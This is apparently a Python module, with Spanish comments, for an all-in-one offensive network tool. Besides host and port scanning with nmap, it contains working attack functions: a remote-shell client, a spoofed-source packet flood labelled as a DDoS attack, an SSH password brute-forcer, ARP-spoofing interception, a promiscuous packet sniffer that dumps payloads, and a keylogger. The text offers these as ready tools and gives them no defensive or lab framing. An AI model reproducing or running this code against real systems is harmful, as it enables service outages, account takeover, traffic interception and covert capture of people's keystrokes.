# Módulos estándar
import os
import time
# Añade estos imports al inicio (junto con los otros):
from socket import (socket, AF_INET, SOCK_STREAM, setdefaulttimeout, timeout as socket_timeout , gethostbyname, gaierror, error as socket_error)
import subprocess
import random
import logging
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Optional, List, Dict, Union, Tuple

# Redes y escaneo
import nmap
import netifaces
import ipaddress

# Librerías de ataque y análisis
from scapy.all import Raw, send
import scapy.all as scapy
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP, TCP, UDP, ICMP

# SSH y automatización
import paramiko

# Entrada de teclado
import keyboard

# Interfaz gráfica
from tkinter import messagebox

# Configuración mejorada de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('network_tool.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constantes
MAX_THREADS = 10
DEFAULT_TIMEOUT = 5

def validate_ip(ip: str) -> bool:
    """Valida una dirección IP de forma más robusta"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        # Intenta resolver nombres de host
        try:
            gethostbyname(ip)
            return True
        except (gaierror, Exception):
            return False

def get_network_range(interface: Optional[str] = None) -> Optional[str]:
    """Obtiene el rango de red de forma más confiable"""
    try:
        # Primero verifica si nmap está instalado
        subprocess.run(['nmap', '--version'], check=True, 
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        interfaces = netifaces.interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return None
            
        # Excluir loopback y buscar interfaces activas
        target_interface = None
        for iface in interfaces:
            if iface == 'lo':
                continue
            if interface and iface != interface:
                continue
                
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                target_interface = iface
                break
                
        if not target_interface:
            logger.error("No se encontró interfaz con configuración IPv4")
            return None
            
        ip_info = netifaces.ifaddresses(target_interface)[netifaces.AF_INET][0]
        ip = ip_info['addr']
        netmask = ip_info['netmask']
        
        # Calcular red CIDR
        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
        return str(network)
        
    except subprocess.CalledProcessError:
        logger.error("Nmap no está instalado o no es accesible")
        return None
    except Exception as e:
        logger.error(f"Error obteniendo rango de red: {str(e)}", exc_info=True)
        return None

def scan_ports(target_ip: str, start_port: int, end_port: int) -> Tuple[bool, str, List[Dict]]:
    """
    Escanea puertos en un rango específico y devuelve los resultados
    
    Args:
        target_ip: Dirección IP a escanear
        start_port: Puerto inicial del rango
        end_port: Puerto final del rango
    
    Returns:
        Tuple: (success, message, results)
        - success: Booleano que indica si el escaneo fue exitoso
        - message: Mensaje descriptivo del resultado
        - results: Lista de diccionarios con puertos abiertos
          [{'port': int, 'service': str, 'state': str}]
    """
    nm = nmap.PortScanner()
    open_ports = []
    
    try:
        # Validación básica de entrada
        if not target_ip or start_port < 1 or end_port > 65535 or start_port > end_port:
            return False, "Rango de puertos inválido", []
        
        port_range = f"{start_port}-{end_port}"
        
        # Escaneo TCP Connect (no requiere privilegios root)
        nm.scan(hosts=target_ip, ports=port_range, arguments='-sT --open')
        
        if target_ip not in nm.all_hosts():
            return False, f"El host {target_ip} no respondió", []
        
        # Procesar resultados
        for proto in nm[target_ip].all_protocols():
            for port, info in nm[target_ip][proto].items():
                if info['state'] == 'open':
                    open_ports.append({
                        'port': port,
                        'service': info.get('name', 'desconocido'),
                        'state': info['state']
                    })
        
        if open_ports:
            message = f"Escaneo completado. {len(open_ports)} puertos abiertos encontrados."
            return True, message, sorted(open_ports, key=lambda x: x['port'])
        else:
            return True, "No se encontraron puertos abiertos en el rango especificado", []
            
    except nmap.PortScannerError as e:
        return False, f"Error de Nmap: {str(e)}", []
    except Exception as e:
        return False, f"Error inesperado: {str(e)}", []

def scan_network(ip_range: Optional[str] = None) -> List[Dict[str, str]]:
    """Escanea dispositivos en la red con mejoras significativas"""
    try:
        # Verificar privilegios
        if os.geteuid() != 0:
            raise PermissionError("Se requieren privilegios de root para escaneos de red")
            
        # Obtener rango de red
        if ip_range is None:
            ip_range = get_network_range()
            if not ip_range:
                # Fallback: usar rango común si la detección falla
                ip_range = "192.168.1.0/24"
                logger.warning(f"Usando rango por defecto: {ip_range}")
                
        logger.info(f"Iniciando escaneo en: {ip_range}")
        
        nm = nmap.PortScanner()
        # Argumentos optimizados para detección de hosts
        nm.scan(
            hosts=ip_range,
            arguments='-sP'
        )
        
        devices = []
        for host in nm.all_hosts():
            try:
                host_info = {
                    'ip': host,
                    'mac': nm[host]['addresses'].get('mac', 'Desconocida').upper(),
                    'hostname': 'Desconocido',
                    'status': nm[host].state(),
                    'vendor': nm[host].get('vendor', {}).get(nm[host]['addresses'].get('mac', ''), '')
                }
                
                # Mejor obtención de hostname
                hostnames = nm[host].hostnames()
                if hostnames:
                    host_info['hostname'] = hostnames[0].get('name', host_info['hostname'])
                    
                devices.append(host_info)
                
            except Exception as host_error:
                logger.warning(f"Error procesando host {host}: {str(host_error)}")
                continue
                
        logger.info(f"Escaneo completado. Dispositivos encontrados: {len(devices)}")
        return devices
        
    except PermissionError as pe:
        logger.error(str(pe))
        return []
    except Exception as e:
        logger.error(f"Error en escaneo de red: {str(e)}", exc_info=True)
        return []

def reverse_shell(target_ip: str, port: int = 5000, timeout: int = 30) -> None:
    """Shell inverso con manejo robusto de errores y reconexión."""
    if not validate_ip(target_ip):
        raise ValueError(f"IP inválida: {target_ip}")

    setdefaulttimeout(timeout)  # Timeout ajustable

    while True:
        try:
            with socket(AF_INET, SOCK_STREAM) as s:
                logger.info(f"Conectando a {target_ip}:{port}...")
                s.connect((target_ip, port))
                logger.info(f"Conexión establecida. Timeout: {timeout}s")

                while True:
                    try:
                        cmd = input("$ ").strip()
                        if cmd.lower() in ('exit', 'quit'):
                            return

                        s.sendall(cmd.encode() + b'\n')
                        
                        # Espera datos con timeout
                        response = s.recv(4096).decode('utf-8', errors='ignore')
                        if not response:
                            logger.warning("Conexión cerrada por el host remoto")
                            break
                        print(response)

                    except socket_timeout:  # ¡Ahora está definido!
                        logger.warning(f"Timeout: no hay respuesta en {timeout}s")
                        continue
                    except KeyboardInterrupt:
                        logger.info("\nSesión finalizada por el usuario")
                        return
                    except Exception as e:
                        logger.error(f"Error en comando: {str(e)}")
                        break

        except ConnectionRefusedError:
            logger.error(f"No se pudo conectar a {target_ip}:{port}. ¿Servicio activo?")
        except socket_error as e:
            logger.error(f"Error de socket: {str(e)}")
        except Exception as e:
            logger.critical(f"Error crítico: {str(e)}")
        
        # Reconexión automática después de 5 segundos
        logger.info("Reintentando en 5 segundos...")
        time.sleep(5)

def ddos_attack(target_ip, port, duration):
    start_time = time.time()
    sent = 0
    protocols = ['TCP', 'UDP', 'ICMP']
    payload = Raw(load="X" * 1024)  # 1 KB de datos falsos

    try:
        while time.time() - start_time < duration:
            proto = random.choice(protocols)
            dst_port = random.randint(1, 65535)
            src_port = random.randint(1024, 65535)
            spoof_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

            if proto == 'TCP':
                pkt = IP(dst=target_ip, src=spoof_ip) / TCP(sport=src_port, dport=dst_port, flags="S") / payload
            elif proto == 'UDP':
                pkt = IP(dst=target_ip, src=spoof_ip) / UDP(sport=src_port, dport=dst_port) / payload
            elif proto == 'ICMP':
                pkt = IP(dst=target_ip, src=spoof_ip) / ICMP() / payload

            send(pkt, verbose=0)
            sent += 1

        return f"✅ DDoS finalizado: {sent} paquetes enviados a {target_ip}:{port} en {duration} segundos."
    
    except Exception as e:
        return f"❌ Error durante el ataque DDoS: {e}"

def ssh_bruteforce(host, username, password_file, port=22):
    logger = logging.getLogger(__name__)
    logger.info("Iniciando ataque de fuerza bruta...")

    # Verifica que el archivo existe
    if not os.path.isfile(password_file):
        logger.error(f"Archivo no encontrado: {password_file}")
        return f"[ERROR] Archivo no encontrado: {password_file}"

    # Carga las contraseñas
    try:
        with open(password_file, "r") as file:
            passwords = [line.strip() for line in file if line.strip()]
    except Exception as e:
        logger.error(f"No se pudo leer el archivo: {e}")
        return f"[ERROR] No se pudo leer el archivo: {e}"

    if not passwords:
        logger.warning("El archivo de contraseñas está vacío.")
        return "[ERROR] El archivo de contraseñas está vacío."

    for password in passwords:
        logger.info(f"Probando contraseña: {password}")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=5)
            logger.info(f"¡Contraseña encontrada! Usuario: {username} | Contraseña: {password}")
            client.close()
            return f"[ÉXITO] Usuario: {username} | Contraseña: {password}"
        except paramiko.AuthenticationException:
            logger.warning("Contraseña incorrecta.")
        except paramiko.SSHException as e:
            logger.error(f"Error SSH: {e}")
            time.sleep(3)  # Espera si hay muchos intentos
        except Exception as e:
            logger.error(f"Error general: {e}")
        finally:
            try:
                client.close()
            except:
                pass

    logger.info("Fuerza bruta finalizada. No se encontró una contraseña válida.")
    return "[INFO] Fuerza bruta finalizada. No se encontró una contraseña válida."

def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> Optional[threading.Event]:
    try:
        iface = interface or scapy.conf.iface
        print(f"[INFO] Usando interfaz: {iface}")

        target_mac = scapy.getmacbyip(target_ip)
        gateway_mac = scapy.getmacbyip(gateway_ip)

        if not target_mac:
            raise ValueError(f"No se pudo obtener la MAC de {target_ip}")
        if not gateway_mac:
            raise ValueError(f"No se pudo obtener la MAC de {gateway_ip}")

        stop_event = threading.Event()

        def restore_network():
            try:
                print("[INFO] Restaurando tablas ARP...")
                scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac),
                            iface=iface, count=5, verbose=False)
                scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac),
                            iface=iface, count=5, verbose=False)
                print("[OK] Tablas ARP restauradas.")
            except Exception as e:
                print(f"[ERROR] Falló la restauración de red: {e}")

        def arp_spoof():
            print(f"[INFO] Iniciando ARP spoofing entre {target_ip} y {gateway_ip}")
            try:
                while not stop_event.is_set():
                    scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac),
                                iface=iface, verbose=False)
                    scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac),
                                iface=iface, verbose=False)
                    time.sleep(2)
            except Exception as e:
                print(f"[ERROR] Falló el spoofing: {e}")
            finally:
                restore_network()
                print("[INFO] Spoofing detenido.")

        # Inicia el hilo
        threading.Thread(target=arp_spoof, daemon=True).start()
        return stop_event

    except Exception as e:
        print(f"[ERROR] No se pudo iniciar el ataque MITM: {e}")
        return None

class PacketSniffer:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def packet_sniffer(self, interface: str, packet_filter: str, stop_event: threading.Event, packet_callback=None):
        """Captura paquetes y llama a packet_callback con cada resumen."""
        import scapy.all as scapy
        from scapy.layers.http import HTTPRequest
        from scapy.layers.inet import IP, TCP, UDP, ICMP
        from scapy.packet import Raw
        from datetime import datetime
        import logging

        logger = logging.getLogger(__name__)

        def process_packet(packet):
            try:
                summary = self._analyze_packet(packet)
                if packet_callback:
                    packet_callback(summary)  # Aquí se envía a la GUI
                if stop_event.is_set():
                    raise KeyboardInterrupt
            except Exception as e:
                logger.error(f"Error processing packet: {str(e)}")

        try:
            scapy.conf.iface = interface
            scapy.conf.sniff_promisc = True
            scapy.sniff(
                filter=packet_filter,
                prn=process_packet,
                store=False,
                stop_filter=lambda x: stop_event.is_set()
            )
        except KeyboardInterrupt:
            logger.info("Sniffer stopped by user")
        except Exception as e:
            logger.error(f"Sniffing error: {str(e)}")

    def _analyze_packet(self, pkt):
        proto = ""
        summary = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] "

        if IP in pkt:
            ip_layer = pkt[IP]
            summary += f"{ip_layer.src} -> {ip_layer.dst} | "

            if TCP in pkt:
                tcp = pkt[TCP]
                proto = "TCP"
                flags = tcp.sprintf("%TCP.flags%")
                summary += f"TCP {tcp.sport}->{tcp.dport} Flags:{flags}"
                if Raw in pkt:
                    raw_data = bytes(pkt[Raw]).decode(errors="replace").strip()
                    if raw_data:
                        summary += f" Data:{raw_data}"
            elif UDP in pkt:
                udp = pkt[UDP]
                proto = "UDP"
                summary += f"UDP {udp.sport}->{udp.dport}"
                if Raw in pkt:
                    raw_data = bytes(pkt[Raw]).decode(errors="replace").strip()
                    if raw_data:
                        summary += f" Data:{raw_data}"
            elif ICMP in pkt:
                proto = "ICMP"
                summary += f"ICMP Type:{pkt[ICMP].type} Code:{pkt[ICMP].code}"
            else:
                proto = "Other"
                summary += f"Protocol: {ip_layer.proto}"
        else:
            summary += "Non-IP Packet"

        return summary

def keylogger(output_file: str = "keylog.txt", stop_key: str = 'f12') -> Optional[str]:
    """Keylogger mejorado con más controles"""
    try:
        if os.path.exists(output_file):
            os.rename(output_file, f"{output_file}.bak")
            
        logger.info(f"Iniciando keylogger. Presione {stop_key.upper()} para detener...")
        
        def on_key_event(event):
            """Procesa eventos de teclado"""
            with open(output_file, 'a', encoding='utf-8') as f:
                key = event.name
                if event.event_type == 'down':
                    if key == 'space':
                        f.write(' ')
                    elif key == 'enter':
                        f.write('\n')
                    elif key == 'backspace':
                        f.write('[BACKSPACE]')
                    elif len(key) > 1:
                        f.write(f'[{key.upper()}]')
                    else:
                        f.write(key)
                        
        keyboard.hook(on_key_event)
        keyboard.wait(stop_key)  # Esta línea bloquea hasta que se presione la tecla de parada
        keyboard.unhook_all()
        
        # Leer y retornar resultados
        if os.path.exists(output_file):
            with open(output_file, 'r', encoding='utf-8') as f:
                return f.read()
        return None
        
    except Exception as e:
        logger.error(f"Error en keylogger: {str(e)}", exc_info=True)
        return None